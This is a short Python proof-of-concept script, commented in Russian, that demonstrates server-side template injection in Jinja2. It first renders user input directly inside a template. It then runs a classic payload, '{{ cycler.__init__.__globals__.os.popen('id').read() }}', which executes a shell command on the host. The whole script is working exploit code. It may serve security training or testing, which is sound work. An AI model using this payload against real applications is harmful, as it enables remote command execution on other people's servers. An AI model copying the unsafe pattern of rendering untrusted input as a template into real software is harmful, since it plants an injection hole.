from jinja2 import Template
import jinja2
print("Jinja2 version:", jinja2.__version__)
# 1. пользовательский ввод попадает прямо в шаблон
user_input = "{{7*7}}"
print("output:", Template(f"Результат: {user_input}").render())
# 2. классический SSTI -> RCE пейлоад
payload = "{{ cycler.__init__.__globals__.os.popen('id').read() }}"
print("SSTI -> RCE:", Template(payload).render().strip())
